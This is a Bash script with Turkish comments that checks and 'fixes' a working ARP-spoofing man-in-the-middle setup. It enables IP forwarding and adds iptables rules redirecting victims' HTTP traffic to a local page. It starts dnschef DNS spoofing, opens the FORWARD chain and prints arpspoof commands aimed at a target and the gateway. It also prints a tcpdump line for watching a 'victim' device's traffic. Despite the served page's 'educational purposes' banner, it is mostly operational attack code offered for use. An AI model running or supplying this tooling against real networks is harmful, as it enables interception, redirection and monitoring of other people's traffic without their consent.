#!/bin/bash

# ARP SPOOFING OTOMATİK DÜZELTME ARACI
# Sorunları tespit edip otomatik düzeltir

if [ "$EUID" -ne 0 ]; then
  echo "HATA: Root yetkileri gerekli."
  exit 1
fi

# Renk kodları
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo "═══════════════════════════════════════════════════════════"
echo "       ARP SPOOFING OTOMATİK DÜZELTME ARACI"
echo "═══════════════════════════════════════════════════════════"
echo ""

# Ağ bilgileri
INTERFACE=$(ip -o -4 route show to default | awk '{print $5}' | head -n1)
GATEWAY_IP=$(ip -o -4 route show to default | awk '{print $3}' | head -n1)
MY_IP=$(ip -o -4 addr show dev "$INTERFACE" 2>/dev/null | awk '{print $4}' | cut -d'/' -f1 | head -n1)

if [ -z "$INTERFACE" ] || [ -z "$GATEWAY_IP" ]; then
    echo -e "${RED}❌ Ağ bilgileri alınamadı!${NC}"
    exit 1
fi

echo "Arayüz: $INTERFACE"
echo "Gateway: $GATEWAY_IP"
echo "Kendi IP: $MY_IP"
echo ""

FIXED=0
ISSUES=0

# 1. IP FORWARDING KONTROLÜ
echo -e "${BLUE}[1/8] IP Forwarding Kontrolü${NC}"
IP_FORWARD=$(cat /proc/sys/net/ipv4/ip_forward)
if [ "$IP_FORWARD" != "1" ]; then
    echo -e "${YELLOW}⚠️  IP Forwarding kapalı${NC}"
    echo "   Düzeltiliyor..."
    echo 1 > /proc/sys/net/ipv4/ip_forward
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}✅ Düzeltildi${NC}"
        FIXED=$((FIXED + 1))
    else
        echo -e "${RED}❌ Düzeltilemedi${NC}"
        ISSUES=$((ISSUES + 1))
    fi
else
    echo -e "${GREEN}✅ Aktif${NC}"
fi
echo ""

# 2. IPTABLES KURALLARI KONTROLÜ
echo -e "${BLUE}[2/8] iptables Kuralları Kontrolü${NC}"

# Mevcut sorunlu kuralları tespit et
INTERFACE_RULE=$(iptables -t nat -L PREROUTING -n --line-numbers 2>/dev/null | grep -E "\-i.*80.*8080")
WORKING_RULE=$(iptables -t nat -L PREROUTING -n 2>/dev/null | grep -E "REDIRECT.*tcp.*dpt:80.*redir ports 8080" | grep -v "\-i")

if [ -z "$WORKING_RULE" ]; then
    echo -e "${YELLOW}⚠️  Çalışan HTTP yönlendirme kuralı yok${NC}"
    ISSUES=$((ISSUES + 1))
    
    # Sorunlu interface-specific kuralları temizle
    if [ ! -z "$INTERFACE_RULE" ]; then
        echo "   Interface'e özel sorunlu kural bulundu, temizleniyor..."
        iptables -t nat -D PREROUTING -i "$INTERFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null
    fi
    
    # Doğru kuralı ekle
    echo "   Genel HTTP yönlendirme kuralı ekleniyor..."
    iptables -t nat -I PREROUTING 1 -p tcp --destination-port 80 -j REDIRECT --to-port 8080
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}✅ Kural eklendi${NC}"
        FIXED=$((FIXED + 1))
    else
        echo -e "${RED}❌ Kural eklenemedi${NC}"
    fi
else
    echo -e "${GREEN}✅ Çalışan kural mevcut${NC}"
    
    # Ama interface-specific kural varsa uyar
    if [ ! -z "$INTERFACE_RULE" ]; then
        echo -e "${YELLOW}⚠️  Interface'e özel kural da var (gereksiz)${NC}"
        echo "   Temizleniyor..."
        iptables -t nat -D PREROUTING -i "$INTERFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null
        echo -e "${GREEN}✅ Gereksiz kural temizlendi${NC}"
        FIXED=$((FIXED + 1))
    fi
fi

# OUTPUT chain kontrolü (opsiyonel)
OUTPUT_RULE=$(iptables -t nat -L OUTPUT -n 2>/dev/null | grep -E "REDIRECT.*tcp.*dpt:80.*redir ports 8080")
if [ -z "$OUTPUT_RULE" ]; then
    echo "   OUTPUT chain için kural ekleniyor (yerel test için)..."
    iptables -t nat -I OUTPUT 1 -p tcp --destination-port 80 -j REDIRECT --to-port 8080 2>/dev/null
    echo -e "${GREEN}✅ OUTPUT kuralı eklendi${NC}"
fi

echo ""

# 3. WEB SUNUCU KONTROLÜ
echo -e "${BLUE}[3/8] Web Sunucu Kontrolü (Port 8080)${NC}"

# Port kullanımda mı?
PORT_IN_USE=$(ss -tlnp | grep ":8080")

if [ -z "$PORT_IN_USE" ]; then
    echo -e "${YELLOW}⚠️  Port 8080 dinlenmiyor${NC}"
    ISSUES=$((ISSUES + 1))
    
    # index.html var mı kontrol et
    if [ ! -f "index.html" ]; then
        echo "   index.html oluşturuluyor..."
        cat > index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Ağ Güvenlik Testi</title>
    <meta charset="UTF-8">
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 50px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        h1 { font-size: 3em; margin-bottom: 20px; }
        .emoji { font-size: 5em; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="emoji">⚠️</div>
        <h1>Güvenlik Testi Aktif</h1>
        <p style="font-size: 1.3em;">Bu ağda ARP Spoofing güvenlik testi yapılmaktadır.</p>
        <p style="font-size: 1.1em;">Tüm HTTP trafiğiniz izlenmektedir.</p>
        <p><strong>Eğitim Amaçlı - Yetkisiz Kullanım Yasaktır</strong></p>
    </div>
</body>
</html>
EOF
    fi
    
    # Web sunucusu başlat
    echo "   Web sunucusu başlatılıyor..."
    python -m http.server 8080 &>/dev/null &
    sleep 2
    
    # Kontrol et
    if ss -tlnp | grep -q ":8080"; then
        echo -e "${GREEN}✅ Web sunucusu başlatıldı${NC}"
        FIXED=$((FIXED + 1))
    else
        echo -e "${RED}❌ Web sunucusu başlatılamadı${NC}"
    fi
else
    echo -e "${GREEN}✅ Web sunucusu çalışıyor${NC}"
    echo "$PORT_IN_USE" | sed 's/^/   /'
fi
echo ""

# 4. ARP SPOOFING SÜREÇLER
echo -e "${BLUE}[4/8] ARP Spoofing Süreçleri${NC}"
ARPSPOOF_COUNT=$(ps aux | grep -c "[a]rpspoof")

if [ $ARPSPOOF_COUNT -eq 0 ]; then
    echo -e "${YELLOW}⚠️  Hiç arpspoof süreci çalışmıyor${NC}"
    echo "   Not: Bu script sadece kontrol eder, hedef belirleme gerekir"
    echo "   Manuel başlatmak için:"
    echo "   sudo arpspoof -i $INTERFACE -t <hedef_ip> $GATEWAY_IP &"
    echo "   sudo arpspoof -i $INTERFACE -t $GATEWAY_IP <hedef_ip> &"
else
    echo -e "${GREEN}✅ $ARPSPOOF_COUNT arpspoof süreci çalışıyor${NC}"
fi
echo ""

# 5. DNS SPOOFING KONTROLÜ
echo -e "${BLUE}[5/8] DNS Spoofing Kontrolü${NC}"
DNS_PROCESS=$(ps aux | grep -E "[d]nschef|[d]nsmasq.*conf" | grep -v grep)

if [ -z "$DNS_PROCESS" ]; then
    echo -e "${YELLOW}⚠️  DNS spoofing yok${NC}"
    echo "   Dış ağ siteleri (example.com) çalışmayabilir"
    
    # dnschef veya dnsmasq var mı?
    if command -v dnschef &>/dev/null; then
        echo "   dnschef bulundu, başlatılsın mı? (y/n)"
        read -t 5 -n 1 ANSWER
        echo ""
        if [ "$ANSWER" = "y" ]; then
            echo "   dnschef başlatılıyor..."
            dnschef --fakeip "$MY_IP" --interface "$MY_IP" -q &>/dev/null &
            sleep 2
            
            # DNS yönlendirme kuralı
            iptables -t nat -C PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53 2>/dev/null || \
            iptables -t nat -I PREROUTING 1 -p udp --destination-port 53 -j REDIRECT --to-port 53
            
            if ps aux | grep -q "[d]nschef"; then
                echo -e "${GREEN}✅ DNS spoofing başlatıldı${NC}"
                FIXED=$((FIXED + 1))
            else
                echo -e "${RED}❌ DNS spoofing başlatılamadı${NC}"
            fi
        fi
    elif command -v dnsmasq &>/dev/null; then
        echo "   dnsmasq bulundu ama manuel kurulum gerekir"
        echo "   Kurulum: dnsmasq conf dosyası oluştur ve başlat"
    else
        echo "   Çözüm: yay -S dnschef  VEYA  sudo pacman -S dnsmasq"
    fi
else
    echo -e "${GREEN}✅ DNS spoofing aktif${NC}"
fi
echo ""

# 6. FORWARD CHAIN KONTROLÜ
echo -e "${BLUE}[6/8] FORWARD Chain Kontrolü${NC}"
FORWARD_POLICY=$(iptables -L FORWARD -n | grep "^Chain FORWARD" | awk '{print $4}')

if [ "$FORWARD_POLICY" = "(policy DROP)" ]; then
    echo -e "${YELLOW}⚠️  FORWARD policy DROP${NC}"
    echo "   Paketler forward edilemeyebilir"
    echo "   Düzeltiliyor..."
    iptables -P FORWARD ACCEPT
    iptables -I FORWARD -j ACCEPT
    echo -e "${GREEN}✅ FORWARD policy düzeltildi${NC}"
    FIXED=$((FIXED + 1))
else
    echo -e "${GREEN}✅ FORWARD policy: $FORWARD_POLICY${NC}"
fi
echo ""

# 7. CONNTRACK KONTROLÜ
echo -e "${BLUE}[7/8] Connection Tracking${NC}"
if [ -f /proc/net/nf_conntrack ]; then
    CONNTRACK_COUNT=$(wc -l < /proc/net/nf_conntrack)
    echo -e "${GREEN}✅ Connection tracking aktif ($CONNTRACK_COUNT bağlantı)${NC}"
else
    echo -e "${YELLOW}⚠️  Connection tracking modülü yüklü değil${NC}"
    modprobe nf_conntrack 2>/dev/null
fi
echo ""

# 8. TEST BAĞLANTISI
echo -e "${BLUE}[8/8] Yerel Test Bağlantısı${NC}"
TEST_RESPONSE=$(curl -s -m 3 http://127.0.0.1:8080 2>/dev/null | head -c 50)

if [ -z "$TEST_RESPONSE" ]; then
    echo -e "${RED}❌ Yerel web sunucusuna bağlanılamadı${NC}"
    ISSUES=$((ISSUES + 1))
else
    echo -e "${GREEN}✅ Web sunucusu yanıt veriyor${NC}"
    echo "   Yanıt: ${TEST_RESPONSE:0:50}..."
fi
echo ""

# ÖZET
echo "═══════════════════════════════════════════════════════════"
echo "                      ÖZET"
echo "═══════════════════════════════════════════════════════════"
echo ""
echo -e "Düzeltilen sorunlar: ${GREEN}$FIXED${NC}"
echo -e "Kalan sorunlar: ${RED}$ISSUES${NC}"
echo ""

if [ $ISSUES -eq 0 ]; then
    echo -e "${GREEN}✅ TÜM SİSTEMLER HAZIR!${NC}"
    echo ""
    echo "Test için kurban cihazdan:"
    echo "  • http://neverssl.com"
    echo "  • http://example.com"
    echo ""
    echo "Gerçek zamanlı izleme:"
    echo "  sudo tcpdump -i $INTERFACE -n 'tcp port 80' -A | grep -E 'Host:|GET '"
else
    echo -e "${YELLOW}⚠️  Bazı sorunlar manuel müdahale gerektirebilir${NC}"
fi

echo ""
echo "Mevcut Yapılandırma:"
echo "  • IP Forwarding: $(cat /proc/sys/net/ipv4/ip_forward)"
echo "  • HTTP Redirect: $(iptables -t nat -L PREROUTING -n | grep -c '8080') kural"
echo "  • Web Sunucu: $(ss -tlnp | grep -q ':8080' && echo 'Çalışıyor' || echo 'Durmuş')"
echo "  • ARP Spoofing: $ARPSPOOF_COUNT süreç"
echo "  • DNS Spoofing: $(ps aux | grep -qE '[d]nschef|[d]nsmasq.*conf' && echo 'Aktif' || echo 'Pasif')"
echo ""
echo "═══════════════════════════════════════════════════════════"
